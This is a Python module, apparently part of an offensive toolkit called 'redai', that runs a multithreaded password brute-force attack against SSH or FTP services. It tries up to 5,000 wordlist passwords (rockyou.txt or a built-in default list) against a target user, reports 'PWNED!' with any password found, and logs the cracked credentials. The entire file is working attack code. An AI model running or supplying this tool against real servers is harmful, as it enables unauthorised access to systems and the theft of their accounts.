"""
Brute Force Attack - SSH/FTP
"""

import os
import threading
import concurrent.futures

import paramiko
import ftplib
from rich.console import Console
from rich.panel import Panel

from redai.core.display import display
from redai.core.utils import suggest_ai_analysis
from redai.database.repository import save_scan


console = Console()


def brute(
    target: str,
    project: str = "General",
    service: str = "ssh",
    user: str = "root",
    wordlist: str = "wordlist.txt",
    threads: int = 10,
    auto: bool = False
):
    """Ataque de fuerza bruta optimizado."""
    if not auto:
        display.header(f"Brute Force: {service}://{target}")
    
    # Find wordlist
    paths = [wordlist, "/usr/share/wordlists/rockyou.txt"]
    path = next((r for r in paths if os.path.exists(r) and not r.endswith(".gz")), None)
    
    passwords = []
    if path:
        if not auto:
            console.print(f"[green]üìÇ Using: {path}[/green]")
        try:
            with open(path, "r", encoding="latin-1") as f:
                passwords = [l.strip() for l in f][:5000]  # Limit 5k
        except:
            pass
    else:
        passwords = ["123456", "password", "admin", "root", "toor"]

    if not auto:
        console.print(f"[red]üî• Attacking {service}://{target} with {len(passwords)} passwords...[/red]")
    
    found = None
    stop = threading.Event()
    
    def attempt(p):
        if stop.is_set():
            return None
        try:
            if service == "ssh":
                c = paramiko.SSHClient()
                c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                c.connect(target, username=user, password=p, timeout=2)
                c.close()
                stop.set()
                return p
            elif service == "ftp":
                f = ftplib.FTP()
                f.connect(target, timeout=2)
                f.login(user, p)
                f.quit()
                stop.set()
                return p
        except:
            pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(threads) as ex:
        fs = {ex.submit(attempt, p): p for p in passwords}
        for f in concurrent.futures.as_completed(fs):
            result = f.result()
            if result:
                found = result
                break
            
    out = f"üéâ PWNED! Password: {found}" if found else "‚ùå Attack failed."
    
    if not auto:
        console.print(Panel(out, style="green" if found else "red"))
    
    if found:
        suggest_ai_analysis(f"Brute Force Success: {service}://{target} User: {user} Pass: {found}", "Brute Force Attack")
    
    save_scan(f"{service}://{target}", "brute_force", out, project_name=project)
